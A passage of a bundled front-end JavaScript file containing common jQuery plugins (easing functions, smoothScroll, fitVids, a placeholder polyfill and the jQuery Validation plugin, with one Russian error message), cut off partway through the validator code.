function hexToRgb(t) {
    t = t.replace(/^#?([a-f\d])([a-f\d])([a-f\d])$/i, (function(t, e, i, s) {
        return e + e + i + i + s + s
    }));
    var e = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(t);
    return e ? {
        r: parseInt(e[1], 16),
        g: parseInt(e[2], 16),
        b: parseInt(e[3], 16)
    } : null
}

function clamp(t, e, i) {
    return Math.min(Math.max(t, e), i)
}

function isInArray(t, e) {
    return e.indexOf(t) > -1
}
jQuery.easing.jswing = jQuery.easing.swing, jQuery.extend(jQuery.easing, {
    def: "easeOutQuad",
    swing: function(t, e, i, s, n) {
        return jQuery.easing[jQuery.easing.def](t, e, i, s, n)
    },
    easeInQuad: function(t, e, i, s, n) {
        return s * (e /= n) * e + i
    },
    easeOutQuad: function(t, e, i, s, n) {
        return -s * (e /= n) * (e - 2) + i
    },
    easeInOutQuad: function(t, e, i, s, n) {
        return (e /= n / 2) < 1 ? s / 2 * e * e + i : -s / 2 * (--e * (e - 2) - 1) + i
    },
    easeInCubic: function(t, e, i, s, n) {
        return s * (e /= n) * e * e + i
    },
    easeOutCubic: function(t, e, i, s, n) {
        return s * ((e = e / n - 1) * e * e + 1) + i
    },
    easeInOutCubic: function(t, e, i, s, n) {
        return (e /= n / 2) < 1 ? s / 2 * e * e * e + i : s / 2 * ((e -= 2) * e * e + 2) + i
    },
    easeInQuart: function(t, e, i, s, n) {
        return s * (e /= n) * e * e * e + i
    },
    easeOutQuart: function(t, e, i, s, n) {
        return -s * ((e = e / n - 1) * e * e * e - 1) + i
    },
    easeInOutQuart: function(t, e, i, s, n) {
        return (e /= n / 2) < 1 ? s / 2 * e * e * e * e + i : -s / 2 * ((e -= 2) * e * e * e - 2) + i
    },
    easeInQuint: function(t, e, i, s, n) {
        return s * (e /= n) * e * e * e * e + i
    },
    easeOutQuint: function(t, e, i, s, n) {
        return s * ((e = e / n - 1) * e * e * e * e + 1) + i
    },
    easeInOutQuint: function(t, e, i, s, n) {
        return (e /= n / 2) < 1 ? s / 2 * e * e * e * e * e + i : s / 2 * ((e -= 2) * e * e * e * e + 2) + i
    },
    easeInSine: function(t, e, i, s, n) {
        return -s * Math.cos(e / n * (Math.PI / 2)) + s + i
    },
    easeOutSine: function(t, e, i, s, n) {
        return s * Math.sin(e / n * (Math.PI / 2)) + i
    },
    easeInOutSine: function(t, e, i, s, n) {
        return -s / 2 * (Math.cos(Math.PI * e / n) - 1) + i
    },
    easeInExpo: function(t, e, i, s, n) {
        return 0 == e ? i : s * Math.pow(2, 10 * (e / n - 1)) + i
    },
    easeOutExpo: function(t, e, i, s, n) {
        return e == n ? i + s : s * (1 - Math.pow(2, -10 * e / n)) + i
    },
    easeInOutExpo: function(t, e, i, s, n) {
        return 0 == e ? i : e == n ? i + s : (e /= n / 2) < 1 ? s / 2 * Math.pow(2, 10 * (e - 1)) + i : s / 2 * (2 - Math.pow(2, -10 * --e)) + i
    },
    easeInCirc: function(t, e, i, s, n) {
        return -s * (Math.sqrt(1 - (e /= n) * e) - 1) + i
    },
    easeOutCirc: function(t, e, i, s, n) {
        return s * Math.sqrt(1 - (e = e / n - 1) * e) + i
    },
    easeInOutCirc: function(t, e, i, s, n) {
        return (e /= n / 2) < 1 ? -s / 2 * (Math.sqrt(1 - e * e) - 1) + i : s / 2 * (Math.sqrt(1 - (e -= 2) * e) + 1) + i
    },
    easeInElastic: function(t, e, i, s, n) {
        var o = 1.70158,
            r = 0,
            a = s;
        if (0 == e) return i;
        if (1 == (e /= n)) return i + s;
        if (r || (r = .3 * n), a < Math.abs(s)) {
            a = s;
            o = r / 4
        } else o = r / (2 * Math.PI) * Math.asin(s / a);
        return -a * Math.pow(2, 10 * (e -= 1)) * Math.sin((e * n - o) * (2 * Math.PI) / r) + i
    },
    easeOutElastic: function(t, e, i, s, n) {
        var o = 1.70158,
            r = 0,
            a = s;
        if (0 == e) return i;
        if (1 == (e /= n)) return i + s;
        if (r || (r = .3 * n), a < Math.abs(s)) {
            a = s;
            o = r / 4
        } else o = r / (2 * Math.PI) * Math.asin(s / a);
        return a * Math.pow(2, -10 * e) * Math.sin((e * n - o) * (2 * Math.PI) / r) + s + i
    },
    easeInOutElastic: function(t, e, i, s, n) {
        var o = 1.70158,
            r = 0,
            a = s;
        if (0 == e) return i;
        if (2 == (e /= n / 2)) return i + s;
        if (r || (r = n * (.3 * 1.5)), a < Math.abs(s)) {
            a = s;
            o = r / 4
        } else o = r / (2 * Math.PI) * Math.asin(s / a);
        return e < 1 ? a * Math.pow(2, 10 * (e -= 1)) * Math.sin((e * n - o) * (2 * Math.PI) / r) * -.5 + i : a * Math.pow(2, -10 * (e -= 1)) * Math.sin((e * n - o) * (2 * Math.PI) / r) * .5 + s + i
    },
    easeInBack: function(t, e, i, s, n, o) {
        return null == o && (o = 1.70158), s * (e /= n) * e * ((o + 1) * e - o) + i
    },
    easeOutBack: function(t, e, i, s, n, o) {
        return null == o && (o = 1.70158), s * ((e = e / n - 1) * e * ((o + 1) * e + o) + 1) + i
    },
    easeInOutBack: function(t, e, i, s, n, o) {
        return null == o && (o = 1.70158), (e /= n / 2) < 1 ? s / 2 * (e * e * ((1 + (o *= 1.525)) * e - o)) + i : s / 2 * ((e -= 2) * e * ((1 + (o *= 1.525)) * e + o) + 2) + i
    },
    easeInBounce: function(t, e, i, s, n) {
        return s - jQuery.easing.easeOutBounce(t, n - e, 0, s, n) + i
    },
    easeOutBounce: function(t, e, i, s, n) {
        return (e /= n) < 1 / 2.75 ? s * (7.5625 * e * e) + i : e < 2 / 2.75 ? s * (7.5625 * (e -= 1.5 / 2.75) * e + .75) + i : e < 2.5 / 2.75 ? s * (7.5625 * (e -= 2.25 / 2.75) * e + .9375) + i : s * (7.5625 * (e -= 2.625 / 2.75) * e + .984375) + i
    },
    easeInOutBounce: function(t, e, i, s, n) {
        return e < n / 2 ? .5 * jQuery.easing.easeInBounce(t, 2 * e, 0, s, n) + i : .5 * jQuery.easing.easeOutBounce(t, 2 * e - n, 0, s, n) + .5 * s + i
    }
}),
    function(t) {
        "function" == typeof define && define.amd ? define(["jquery"], t) : t("object" == typeof module && module.exports ? require("jquery") : jQuery)
    }((function(t) {
        var e = {},
            i = function(e) {
                var i = [],
                    s = !1,
                    n = e.dir && "left" === e.dir ? "scrollLeft" : "scrollTop";
                return this.each((function() {
                    var e = t(this);
                    if (this !== document && this !== window) return !document.scrollingElement || this !== document.documentElement && this !== document.body ? void(e[n]() > 0 ? i.push(this) : (e[n](1), s = e[n]() > 0, s && i.push(this), e[n](0))) : (i.push(document.scrollingElement), !1)
                })), i.length || this.each((function() {
                    this === document.documentElement && "smooth" === t(this).css("scrollBehavior") && (i = [this]), i.length || "BODY" !== this.nodeName || (i = [this])
                })), "first" === e.el && i.length > 1 && (i = [i[0]]), i
            },
            s = /^([\-\+]=)(\d+)/;
        t.fn.extend({
            scrollable: function(t) {
                var e = i.call(this, {
                    dir: t
                });
                return this.pushStack(e)
            },
            firstScrollable: function(t) {
                var e = i.call(this, {
                    el: "first",
                    dir: t
                });
                return this.pushStack(e)
            },
            smoothScroll: function(e, i) {
                if ("options" === (e = e || {})) return i ? this.each((function() {
                    var e = t(this),
                        s = t.extend(e.data("ssOpts") || {}, i);
                    t(this).data("ssOpts", s)
                })) : this.first().data("ssOpts");
                var s = t.extend({}, t.fn.smoothScroll.defaults, e),
                    n = function(e) {
                        var i = function(t) {
                                return t.replace(/(:|\.|\/)/g, "\\$1")
                            },
                            n = this,
                            o = t(this),
                            r = t.extend({}, s, o.data("ssOpts") || {}),
                            a = s.exclude,
                            l = r.excludeWithin,
                            c = 0,
                            d = 0,
                            h = !0,
                            u = {},
                            p = t.smoothScroll.filterPath(location.pathname),
                            f = t.smoothScroll.filterPath(n.pathname),
                            m = location.hostname === n.hostname || !n.hostname,
                            v = r.scrollTarget || f === p,
                            g = i(n.hash);
                        if (g && !t(g).length && (h = !1), r.scrollTarget || m && v && g) {
                            for (; h && c < a.length;) o.is(i(a[c++])) && (h = !1);
                            for (; h && d < l.length;) o.closest(l[d++]).length && (h = !1)
                        } else h = !1;
                        h && (r.preventDefault && e.preventDefault(), t.extend(u, r, {
                            scrollTarget: r.scrollTarget || g,
                            link: n
                        }), t.smoothScroll(u))
                    };
                return null !== e.delegateSelector ? this.off("click.smoothscroll", e.delegateSelector).on("click.smoothscroll", e.delegateSelector, n) : this.off("click.smoothscroll").on("click.smoothscroll", n), this
            }
        });
        var n = function(t) {
            var e = {
                    relative: ""
                },
                i = "string" == typeof t && s.exec(t);
            return "number" == typeof t ? e.px = t : i && (e.relative = i[1], e.px = parseFloat(i[2]) || 0), e
        };
        t.smoothScroll = function(i, s) {
            if ("options" === i && "object" == typeof s) return t.extend(e, s);
            var o, r, a, l, c = n(i),
                d = 0,
                h = "offset",
                u = "scrollTop",
                p = {},
                f = {};
            c.px ? o = t.extend({
                link: null
            }, t.fn.smoothScroll.defaults, e) : ((o = t.extend({
                link: null
            }, t.fn.smoothScroll.defaults, i || {}, e)).scrollElement && (h = "position", "static" === o.scrollElement.css("position") && o.scrollElement.css("position", "relative")), s && (c = n(s))), u = "left" === o.direction ? "scrollLeft" : u, o.scrollElement ? (r = o.scrollElement, c.px || /^(?:HTML|BODY)$/.test(r[0].nodeName) || (d = r[u]())) : r = t("html, body").firstScrollable(o.direction), o.beforeScroll.call(r, o), l = c.px ? c : {
                relative: "",
                px: t(o.scrollTarget)[h]() && t(o.scrollTarget)[h]()[o.direction] || 0
            }, p[u] = l.relative + (l.px + d + o.offset), "auto" === (a = o.speed) && (a = Math.abs(p[u] - r[u]()) / o.autoCoefficient), f = {
                duration: a,
                easing: o.easing,
                complete: function() {
                    o.afterScroll.call(o.link, o)
                }
            }, o.step && (f.step = o.step), r.length ? r.stop().animate(p, f) : o.afterScroll.call(o.link, o)
        }, t.smoothScroll.version = "2.1.2", t.smoothScroll.filterPath = function(t) {
            return (t = t || "").replace(/^\//, "").replace(/(?:index|default).[a-zA-Z]{3,4}$/, "").replace(/\/$/, "")
        }, t.fn.smoothScroll.defaults = {
            exclude: [],
            excludeWithin: [],
            offset: 0,
            direction: "top",
            delegateSelector: null,
            scrollElement: null,
            scrollTarget: null,
            beforeScroll: function() {},
            afterScroll: function() {},
            easing: "swing",
            speed: 400,
            autoCoefficient: 2,
            preventDefault: !0
        }
    })),
    function(t) {
        "use strict";
        t.fn.fitVids = function(e) {
            var i = {
                customSelector: null
            };
            if (!document.getElementById("fit-vids-style")) {
                var s = document.head || document.getElementsByTagName("head")[0],
                    n = document.createElement("div");
                n.innerHTML = '<p>x</p><style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style>', s.appendChild(n.childNodes[1])
            }
            return e && t.extend(i, e), this.each((function() {
                var e = ["iframe[src*='player.vimeo.com']", "iframe[src*='youtube.com']", "iframe[src*='youtube-nocookie.com']", "iframe[src*='kickstarter.com'][src*='video.html']", "object", "embed"];
                i.customSelector && e.push(i.customSelector);
                var s = t(this).find(e.join(","));
                (s = s.not("object object")).each((function() {
                    var e = t(this);
                    if (!("embed" === this.tagName.toLowerCase() && e.parent("object").length || e.parent(".fluid-width-video-wrapper").length)) {
                        e.css("height") || e.css("width") || !isNaN(e.attr("height")) && !isNaN(e.attr("width")) || (e.attr("height", 9), e.attr("width", 16));
                        var i = ("object" === this.tagName.toLowerCase() || e.attr("height") && !isNaN(parseInt(e.attr("height"), 10)) ? parseInt(e.attr("height"), 10) : e.height()) / (isNaN(parseInt(e.attr("width"), 10)) ? e.width() : parseInt(e.attr("width"), 10));
                        if (!e.attr("id")) {
                            var s = "fitvid" + Math.floor(999999 * Math.random());
                            e.attr("id", s)
                        }
                        e.wrap('<div class="fluid-width-video-wrapper"></div>').parent(".fluid-width-video-wrapper").css("padding-top", 100 * i + "%"), e.removeAttr("height").removeAttr("width")
                    }
                }))
            }))
        }
    }(window.jQuery || window.Zepto),
    function(t) {
        "function" == typeof define && define.amd ? define(["jquery"], t) : t("object" == typeof module && module.exports ? require("jquery") : jQuery)
    }((function(t) {
        function e(e, i) {
            var n = this,
                o = t(this);
            if (n.value === o.attr(r ? "placeholder-x" : "placeholder") && o.hasClass(u.customClass))
                if (n.value = "", o.removeClass(u.customClass), o.data("placeholder-password")) {
                    if (o = o.hide().nextAll('input[type="password"]:first').show().attr("id", o.removeAttr("id").data("placeholder-id")), !0 === e) return o[0].value = i, i;
                    o.focus()
                } else n == s() && n.select()
        }

        function i(i) {
            var s, n = this,
                o = t(this),
                a = n.id;
            if (!i || "blur" !== i.type || !o.hasClass(u.customClass))
                if ("" === n.value) {
                    if ("password" === n.type) {
                        if (!o.data("placeholder-textinput")) {
                            try {
                                s = o.clone().prop({
                                    type: "text"
                                })
                            } catch (e) {
                                s = t("<input>").attr(t.extend(function(e) {
                                    var i = {},
                                        s = /^jQuery\d+$/;
                                    return t.each(e.attributes, (function(t, e) {
                                        e.specified && !s.test(e.name) && (i[e.name] = e.value)
                                    })), i
                                }(this), {
                                    type: "text"
                                }))
                            }
                            s.removeAttr("name").data({
                                "placeholder-enabled": !0,
                                "placeholder-password": o,
                                "placeholder-id": a
                            }).bind("focus.placeholder", e), o.data({
                                "placeholder-textinput": s,
                                "placeholder-id": a
                            }).before(s)
                        }
                        n.value = "", o = o.removeAttr("id").hide().prevAll('input[type="text"]:first').attr("id", o.data("placeholder-id")).show()
                    } else {
                        var l = o.data("placeholder-password");
                        l && (l[0].value = "", o.attr("id", o.data("placeholder-id")).show().nextAll('input[type="password"]:last').hide().removeAttr("id"))
                    }
                    o.addClass(u.customClass), o[0].value = o.attr(r ? "placeholder-x" : "placeholder")
                } else o.removeClass(u.customClass)
        }

        function s() {
            try {
                return document.activeElement
            } catch (t) {}
        }
        var n, o, r = !1,
            a = "[object OperaMini]" === Object.prototype.toString.call(window.operamini),
            l = "placeholder" in document.createElement("input") && !a && !r,
            c = "placeholder" in document.createElement("textarea") && !a && !r,
            d = t.valHooks,
            h = t.propHooks,
            u = {};
        l && c ? ((o = t.fn.placeholder = function() {
            return this
        }).input = !0, o.textarea = !0) : ((o = t.fn.placeholder = function(s) {
            return u = t.extend({}, {
                customClass: "placeholder"
            }, s), this.filter((l ? "textarea" : ":input") + "[" + (r ? "placeholder-x" : "placeholder") + "]").not("." + u.customClass).not(":radio, :checkbox, [type=hidden]").bind({
                "focus.placeholder": e,
                "blur.placeholder": i
            }).data("placeholder-enabled", !0).trigger("blur.placeholder")
        }).input = l, o.textarea = c, n = {
            get: function(e) {
                var i = t(e),
                    s = i.data("placeholder-password");
                return s ? s[0].value : i.data("placeholder-enabled") && i.hasClass(u.customClass) ? "" : e.value
            },
            set: function(n, o) {
                var r, a, l = t(n);
                return "" !== o && (r = l.data("placeholder-textinput"), a = l.data("placeholder-password"), r ? (e.call(r[0], !0, o) || (n.value = o), r[0].value = o) : a && (e.call(n, !0, o) || (a[0].value = o), n.value = o)), l.data("placeholder-enabled") ? ("" === o ? (n.value = o, n != s() && i.call(n)) : (l.hasClass(u.customClass) && e.call(n), n.value = o), l) : (n.value = o, l)
            }
        }, l || (d.input = n, h.value = n), c || (d.textarea = n, h.value = n), t((function() {
            t(document).delegate("form", "submit.placeholder", (function() {
                var s = t("." + u.customClass, this).each((function() {
                    e.call(this, !0, "")
                }));
                setTimeout((function() {
                    s.each(i)
                }), 10)
            }))
        })), t(window).bind("beforeunload.placeholder", (function() {
            var e = !0;
            try {
                "javascript:void(0)" === document.activeElement.toString() && (e = !1)
            } catch (t) {}
            e && t("." + u.customClass).each((function() {
                this.value = ""
            }))
        })))
    })),
    function(t) {
        "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof module && module.exports ? module.exports = t(require("jquery")) : t(jQuery)
    }((function(t) {
        t.extend(t.fn, {
            validate: function(e) {
                if (this.length) {
                    var i = t.data(this[0], "validator");
                    return i || (this.attr("novalidate", "novalidate"), i = new t.validator(e, this[0]), t.data(this[0], "validator", i), i.settings.onsubmit && (this.on("click.validate", ":submit", (function(e) {
                        i.settings.submitHandler && (i.submitButton = e.target), t(this).hasClass("cancel") && (i.cancelSubmit = !0), void 0 !== t(this).attr("formnovalidate") && (i.cancelSubmit = !0)
                    })), this.on("submit.validate", (function(e) {
                        function s() {
                            var s, n;
                            return !i.settings.submitHandler || (i.submitButton && (s = t("<input type='hidden'/>").attr("name", i.submitButton.name).val(t(i.submitButton).val()).appendTo(i.currentForm)), n = i.settings.submitHandler.call(i, i.currentForm, e), i.submitButton && s.remove(), void 0 !== n && n)
                        }
                        return i.settings.debug && e.preventDefault(), i.cancelSubmit ? (i.cancelSubmit = !1, s()) : i.form() ? i.pendingRequest ? (i.formSubmitted = !0, !1) : s() : (i.focusInvalid(), !1)
                    }))), i)
                }
                e && e.debug && window.console && console.warn("Nothing selected, can't validate, returning nothing.")
            },
            valid: function() {
                var e, i, s;
                return t(this[0]).is("form") ? e = this.validate().form() : (s = [], e = !0, i = t(this[0].form).validate(), this.each((function() {
                    (e = i.element(this) && e) || (s = s.concat(i.errorList))
                })), i.errorList = s), e
            },
            rules: function(e, i) {
                if (this.length) {
                    var s, n, o, r, a, l, c = this[0];
                    if (e) switch (s = t.data(c.form, "validator").settings, n = s.rules, o = t.validator.staticRules(c), e) {
                        case "add":
                            t.extend(o, t.validator.normalizeRule(i)), delete o.messages, n[c.name] = o, i.messages && (s.messages[c.name] = t.extend(s.messages[c.name], i.messages));
                            break;
                        case "remove":
                            return i ? (l = {}, t.each(i.split(/\s/), (function(e, i) {
                                l[i] = o[i], delete o[i], "required" === i && t(c).removeAttr("aria-required")
                            })), l) : (delete n[c.name], o)
                    }
                    return (r = t.validator.normalizeRules(t.extend({}, t.validator.classRules(c), t.validator.attributeRules(c), t.validator.dataRules(c), t.validator.staticRules(c)), c)).required && (a = r.required, delete r.required, r = t.extend({
                        required: a
                    }, r), t(c).attr("aria-required", "true")), r.remote && (a = r.remote, delete r.remote, r = t.extend(r, {
                        remote: a
                    })), r
                }
            }
        }), t.extend(t.expr[":"], {
            blank: function(e) {
                return !t.trim("" + t(e).val())
            },
            filled: function(e) {
                var i = t(e).val();
                return null !== i && !!t.trim("" + i)
            },
            unchecked: function(e) {
                return !t(e).prop("checked")
            }
        }), t.validator = function(e, i) {
            this.settings = t.extend(!0, {}, t.validator.defaults, e), this.currentForm = i, this.init()
        }, t.validator.format = function(e, i) {
            return 1 === arguments.length ? function() {
                var i = t.makeArray(arguments);
                return i.unshift(e), t.validator.format.apply(this, i)
            } : (void 0 === i || (arguments.length > 2 && i.constructor !== Array && (i = t.makeArray(arguments).slice(1)), i.constructor !== Array && (i = [i]), t.each(i, (function(t, i) {
                e = e.replace(new RegExp("\\{" + t + "\\}", "g"), (function() {
                    return i
                }))
            }))), e)
        }, t.extend(t.validator, {
            defaults: {
                messages: {},
                groups: {},
                rules: {},
                errorClass: "error",
                pendingClass: "pending",
                validClass: "valid",
                errorElement: "label",
                focusCleanup: !1,
                focusInvalid: !0,
                errorContainer: t([]),
                errorLabelContainer: t([]),
                onsubmit: !0,
                ignore: ":hidden",
                ignoreTitle: !1,
                onfocusin: function(t) {
                    this.lastActive = t, this.settings.focusCleanup && (this.settings.unhighlight && this.settings.unhighlight.call(this, t, this.settings.errorClass, this.settings.validClass), this.hideThese(this.errorsFor(t)))
                },
                onfocusout: function(t) {
                    this.checkable(t) || !(t.name in this.submitted) && this.optional(t) || this.element(t)
                },
                onkeyup: function(e, i) {
                    9 === i.which && "" === this.elementValue(e) || -1 !== t.inArray(i.keyCode, [16, 17, 18, 20, 35, 36, 37, 38, 39, 40, 45, 144, 225]) || (e.name in this.submitted || e.name in this.invalid) && this.element(e)
                },
                onclick: function(t) {
                    t.name in this.submitted ? this.element(t) : t.parentNode.name in this.submitted && this.element(t.parentNode)
                },
                highlight: function(e, i, s) {
                    "radio" === e.type ? this.findByName(e.name).addClass(i).removeClass(s) : t(e).addClass(i).removeClass(s)
                },
                unhighlight: function(e, i, s) {
                    "radio" === e.type ? this.findByName(e.name).removeClass(i).addClass(s) : t(e).removeClass(i).addClass(s)
                }
            },
            setDefaults: function(e) {
                t.extend(t.validator.defaults, e)
            },
            messages: {
                required: "Данное поле не заполнено.",
                remote: "Please fix this field.",
                email: "Please enter a valid email address.",
                url: "Please enter a valid URL.",
                date: "Please enter a valid date.",
                dateISO: "Please enter a valid date ( ISO ).",
                number: "Please enter a valid number.",
                digits: "Please enter only digits.",
                equalTo: "Please enter the same value again.",
                maxlength: t.validator.format("Please enter no more than {0} characters."),
                minlength: t.validator.format("Please enter at least {0} characters."),
                rangelength: t.validator.format("Please enter a value between {0} and {1} characters long."),
                range: t.validator.format("Please enter a value between {0} and {1}."),
                max: t.validator.format("Please enter a value less than or equal to {0}."),
                min: t.validator.format("Please enter a value greater than or equal to {0}."),
                step: t.validator.format("Please enter a multiple of {0}.")
            },
            autoCreateRanges: !1,
            prototype: {
                init: function() {
                    function e(e) {
                        var i = t.data(this.form, "validator"),
                            s = "on" + e.type.replace(/^validate/, ""),
                            n = i.settings;
                        n[s] && !t(this).is(n.ignore) && n[s].call(i, this, e)
                    }
                    this.labelContainer = t(this.settings.errorLabelContainer), this.errorContext = this.labelContainer.length && this.labelContainer || t(this.currentForm), this.containers = t(this.settings.errorContainer).add(this.settings.errorLabelContainer), this.submitted = {}, this.valueCache = {}, this.pendingRequest = 0, this.pending = {}, this.invalid = {}, this.reset();
                    var i, s = this.groups = {};
                    t.each(this.settings.groups, (function(e, i) {
                        "string" == typeof i && (i = i.split(/\s/)), t.each(i, (function(t, i) {
                            s[i] = e
                        }))
                    })), i = this.settings.rules, t.each(i, (function(e, s) {
                        i[e] = t.validator.normalizeRule(s)
                    })), t(this.currentForm).on("focusin.validate focusout.validate keyup.validate", ":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'], [type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], [type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'], [type='radio'], [type='checkbox'], [contenteditable]", e).on("click.validate", "select, option, [type='radio'], [type='checkbox']", e), this.settings.invalidHandler && t(this.currentForm).on("invalid-form.validate", this.settings.invalidHandler), t(this.currentForm).find("[required], [data-rule-required], .required").attr("aria-required", "true")
                },
                form: function() {
                    return this.checkForm(), t.extend(this.submitted, this.errorMap), this.invalid = t.extend({}, this.errorMap), this.valid() || t(this.currentForm).triggerHandler("invalid-form", [this]), this.showErrors(), this.valid()
                },
                checkForm: function() {
                    this.prepareForm();
                    for (var t = 0, e = this.currentElements = this.elements(); e[t]; t++) this.check(e[t]);
                    return this.valid()
                },
                element: function(e) {
                    var i, s, n = this.clean(e),
                        o = this.validationTargetFor(n),
                        r = this,
                        a = !0;
                    return void 0 === o ? delete this.invalid[n.name] : (this.prepareElement(o), this.currentElements = t(o), (s = this.groups[o.name]) && t.each(this.groups, (function(t, e) {
                        e === s && t !== o.name && ((n = r.validationTargetFor(r.clean(r.findByName(t)))) && n.name in r.invalid && (r.currentElements.push(n), a = a && r.check(n)))
                    })), i = !1 !== this.check(o), a = a && i, this.invalid[o.name] = !i, this.numberOfInvalids() || (this.toHide = this.toHide.add(this.containers)), this.showErrors(), t(e).attr("aria-invalid", !i)), a
                },
                showErrors: function(e) {
                    if (e) {
                        var i = this;
                        t.extend(this.errorMap, e), this.errorList = t.map(this.errorMap, (function(t, e) {
                            return {
                                message: t,
                                element: i.findByName(e)[0]
                            }
                        })), this.successList = t.grep(this.successList, (function(t) {
                            return !(t.name in e)
                        }))
                    }
                    this.settings.showErrors ? this.settings.showErrors.call(this, this.errorMap, this.errorList) : this.defaultShowErrors()
                },
                resetForm: function() {
                    t.fn.resetForm && t(this.currentForm).resetForm(), this.invalid = {}, this.submitted = {}, this.prepareForm(), this.hideErrors();
                    var e = this.elements().removeData("previousValue").removeAttr("aria-invalid");
                    this.resetElements(e)
                },
                resetElements: function(t) {
                    var e;
                    if (this.settings.unhighlight)
                        for (e = 0; t[e]; e++) this.settings.unhighlight.call(this, t[e], this.settings.errorClass, ""), this.findByName(t[e].name).removeClass(this.settings.validClass);
                    else t.removeClass(this.settings.errorClass).removeClass(this.settings.validClass)
                },
                numberOfInvalids: function() {
                    return this.objectLength(this.invalid)
                },
                objectLength: function(t) {
                    var e, i = 0;
                    for (e in t) t[e] && i++;
                    return i
                },
                hideErrors: function() {
                    this.hideThese(this.toHide)
                },
                hideThese: function(t) {
                    t.not(this.containers).text(""), this.addWrapper(t).hide()
                },
                valid: function() {
                    return 0 === this.size()
                },
                size: function() {
                    return this.errorList.length
                },
                focusInvalid: function() {
                    if (this.settings.focusInvalid) try {
                        t(this.findLastActive() || this.errorList.length && this.errorList[0].element || []).filter(":visible").focus().trigger("focusin")
                    } catch (t) {}
                },
                findLastActive: function() {
                    var e = this.lastActive;
                    return e && 1 === t.grep(this.errorList, (function(t) {
                        return t.element.name === e.name
                    })).length && e
                },
                elements: function() {
                    var e = this,
                        i = {};
                    return t(this.currentForm).find("input, select, textarea, [contenteditable]").not(":submit, :reset, :image, :disabled").not(this.settings.ignore).filter((function() {
                        var s = this.name || t(this).attr("name");
                        return !s && e.settings.debug && window.console && console.error("%o has no name assigned", this), this.hasAttribute("contenteditable") && (this.form = t(this).closest("form")[0]), !(s in i || !e.objectLength(t(this).rules())) && (i[s] = !0, !0)
                    }))
                },
                clean: function(e) {
                    return t(e)[0]
                },
                errors: function() {
                    var e = this.settings.errorClass.split(" ").join(".");
                    return t(this.settings.errorElement + "." + e, this.errorContext)
                },
                resetInternals: function() {
                    this.successList = [], this.errorList = [], this.errorMap = {}, this.toShow = t([]), this.toHide = t([])
                },
                reset: function() {
                    this.resetInternals(), this.currentElements = t([])
                },
                prepareForm: function() {
                    this.reset(), this.toHide = this.errors().add(this.containers)
                },
                prepareElement: function(t) {
                    this.reset(), this.toHide = this.errorsFor(t)
                },
                elementValue: function(e) {
                    var i, s, n = t(e),
                        o = e.type;
                    return "radio" === o || "checkbox" === o ? this.findByName(e.name).filter(":checked").val() : "number" === o && void 0 !== e.validity ? e.validity.badInput ? "NaN" : n.val() : (i = e.hasAttribute("contenteditable") ? n.text() : n.val(), "file" === o ? "C:\\fakepath\\" === i.substr(0, 12) ? i.substr(12) : (s = i.lastIndexOf("/")) >= 0 ? i.substr(s + 1) : (s = i.lastIndexOf("\\")) >= 0 ? i.substr(s + 1) : i : "string" == typeof i ? i.replace(/\r/g, "") : i)
                },
                check: function(e) {
                    e = this.validationTargetFor(this.clean(e));
                    var i, s, n, o = t(e).rules(),
                        r = t.map(o, (function(t, e) {
                            return e
                        })).length,
                        a = !1,
                        l = this.elementValue(e);
                    if ("function" == typeof o.normalizer) {
                        if ("string" != typeof(l = o.normalizer.call(e, l))) throw new TypeError("The normalizer should return a string value.");
                        delete o.normalizer
                    }
                    for (s in o) {
                        n = {
                            method: s,
                            parameters: o[s]
                        };
                        try {
                            if ("dependency-mismatch" === (i = t.validator.methods[s].call(this, l, e, n.parameters)) && 1 === r) {
                                a = !0;
                                continue
                            }
                            if (a = !1, "pending" === i) return void(this.toHide = this.toHide.not(this.errorsFor(e)));
                            if (!i) return this.formatAndAdd(e, n), !1
                        } catch (t) {
                            throw this.settings.debug && window.console && console.log("Exception occurred when checking element " + e.id + ", check the '" + n.method + "' method.", t), t instanceof TypeError && (t.message += ".  Exception occurred when checking element " + e.id + ", check the '" + n.method + "' method."), t
                        }
                    }
                    if (!a) return this.objectLength(o) && this.successList.push(e), !0
                },
                customDataMessage: function(e, i) {
                    return t(e).data("msg" + i.charAt(0).toUpperCase() + i.substring(1).toLowerCase()) || t(e).data("msg")
                },
                customMessage: function(t, e) {
                    var i = this.settings.messages[t];
                    return i && (i.constructor === String ? i : i[e])
                },
                findDefined: function() {
                    for (var t = 0; t < arguments.length; t++)
                        if (void 0 !== arguments[t]) return arguments[t]
                },
                defaultMessage: function(e, i) {
                    var s = this.findDefined(this.customMessage(e.name, i.method), this.customDataMessage(e, i.method), !this.settings.ignoreTitle && e.title || void 0, t.validator.messages[i.method], "<strong>Warning: No message defined for " + e.name + "</strong>"),
                        n = /\$?\{(\d+)\}/g;
                    return "function" == typeof s ? s = s.call(this, i.parameters, e) : n.test(s) && (s = t.validator.format(s.replace(n, "{$1}"), i.parameters)), s
                },
                formatAndAdd: function(t, e) {
                    var i = this.defaultMessage(t, e);
                    this.errorList.push({
                        message: i,
                        element: t,
                        method: e.method
                    }), this.errorMap[t.name] = i, this.submitted[t.name] = i
                },
                addWrapper: function(t) {
                    return this.settings.wrapper && (t = t.add(t.parent(this.settings.wrapper))), t
                },
                defaultShowErrors: function() {
                    var t, e, i;
                    for (t = 0; this.errorList[t]; t++) i = this.errorList[t], this.settings.highlight && this.settings.highlight.call(this, i.element, this.settings.errorClass, this.settings.validClass), this.showLabel(i.element, i.message);
                    if (this.errorList.length && (this.toShow = this.toShow.add(this.containers)), this.settings.success)
                        for (t = 0; this.successList[t]; t++) this.showLabel(this.successList[t]);
                    if (this.settings.unhighlight)
                        for (t = 0, e = this.validElements(); e[t]; t++) this.settings.unhighlight.call(this, e[t], this.settings.errorClass, this.settings.validClass);
                    this.toHide = this.toHide.not(this.toShow), this.hideErrors(), this.addWrapper(this.toShow).show()
                },
                validElements: function() {
                    return this.currentElements.not(this.invalidElements())
                },
                invalidElements: function() {
                    return t(this.errorList).map((function() {
                        return this.element
                    }))
                },
                showLabel: function(e, i) {
                    var s, n, o, r, a = this.errorsFor(e),
                        l = this.idOrName(e),
                        c = t(e).attr("aria-describedby");
